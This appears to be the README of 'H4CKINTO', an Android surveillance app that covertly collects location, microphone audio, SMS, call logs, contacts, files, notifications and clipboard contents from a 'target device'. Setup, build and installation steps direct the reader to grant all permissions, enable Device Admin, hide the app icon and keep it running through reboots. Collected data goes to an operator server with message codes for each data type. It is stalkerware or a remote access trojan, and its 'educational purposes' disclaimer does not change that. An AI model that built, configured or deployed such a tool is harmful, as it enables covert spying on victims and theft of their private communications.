# H4CKINTO Android Native App

This is a native Android implementation that works with the existing H4CKINTO server.

## Features

- **Location Tracking**: GPS coordinates with high accuracy
- **Audio Recording**: Microphone recording with configurable duration
- **SMS Management**: Read and send SMS messages
- **Call Logs**: Access to call history
- **Contacts**: Read device contacts
- **File Management**: Access to device files
- **WiFi Scanning**: Scan available WiFi networks
- **Notification Monitoring**: Monitor notifications from important apps
- **Clipboard Monitoring**: Monitor clipboard changes
- **Background Service**: Runs continuously in background
- **Device Admin**: Enhanced device control

## Setup Instructions

### 1. Server Configuration

Update the server URL in `Constants.java`:

```java
public static final String SERVER_URL = "http://your-server-ip:9400";
public static final String SOCKET_URL = "http://your-server-ip:9400";
```

### 2. Build Configuration

1. Open the project in Android Studio
2. Update the `build.gradle` files if needed
3. Sync the project
4. Build the APK

### 3. Installation

1. Install the APK on the target device
2. Grant all required permissions when prompted
3. Enable Device Admin when prompted
4. Enable Notification Access in settings
5. Disable battery optimization for the app

### 4. Permissions Required

The app requires the following permissions:

- **Location**: Fine and coarse location access
- **Microphone**: Audio recording
- **SMS**: Read and send SMS
- **Contacts**: Read contacts
- **Call Logs**: Read call history
- **Storage**: Read external storage
- **WiFi**: Access WiFi state
- **System Alert Window**: Overlay permission
- **Device Admin**: Device administration
- **Notification Access**: Monitor notifications

## Project Structure

```
app/src/main/java/com/h4ckinto/android/
├── MainActivity.java                 # Main activity for setup
├── managers/                        # Feature managers
│   ├── LocationManager.java         # GPS location tracking
│   ├── AudioManager.java            # Audio recording
│   ├── SMSManager.java              # SMS handling
│   ├── ContactsManager.java         # Contacts access
│   └── CallLogManager.java          # Call log access
├── network/
│   └── SocketManager.java           # Server communication
├── service/
│   ├── MainService.java             # Main background service
│   └── NotificationListenerService.java # Notification monitoring
├── receiver/
│   ├── BootReceiver.java            # Boot completion receiver
│   ├── ServiceRestartReceiver.java  # Service restart receiver
│   └── DeviceAdminReceiver.java     # Device admin receiver
└── utils/
    ├── Constants.java               # App constants
    └── PermissionManager.java       # Permission handling
```

## Server Integration

The app communicates with the server using Socket.IO with the following message types:

- `0xLO`: Location data
- `0xMI`: Audio/microphone data
- `0xSM`: SMS data
- `0xCL`: Call log data
- `0xCO`: Contacts data
- `0xFI`: File data
- `0xWI`: WiFi data
- `0xNO`: Notification data
- `0xCB`: Clipboard data
- `0xIN`: Installed apps data
- `0xPM`: Permissions data

## Security Features

- **App Hiding**: Icon is hidden after setup
- **Background Service**: Runs as foreground service
- **Auto-restart**: Automatically restarts on device boot
- **Battery Optimization**: Requests exemption from battery optimization
- **Device Admin**: Enhanced device control capabilities

## Compatibility

- **Minimum Android Version**: API 21 (Android 5.0)
- **Target Android Version**: API 34 (Android 14)
- **Architecture**: ARM, ARM64, x86, x86_64

## Building the APK

1. Open Android Studio
2. Import the project
3. Update server URLs in Constants.java
4. Build → Build Bundle(s) / APK(s) → Build APK(s)
5. The APK will be generated in `app/build/outputs/apk/`

## Troubleshooting

### Common Issues

1. **App not starting**: Check if all permissions are granted
2. **Service not running**: Check battery optimization settings
3. **No data received**: Verify server URL and network connectivity
4. **Location not working**: Ensure location services are enabled

### Debug Mode

Enable debug logging by setting `CONST.debug = true` in the server configuration.

## Legal Notice

This software is for educational purposes only. Use responsibly and in accordance with applicable laws and regulations. The developers are not responsible for any misuse of this software.

## License

ISC License - See LICENSE file for details.
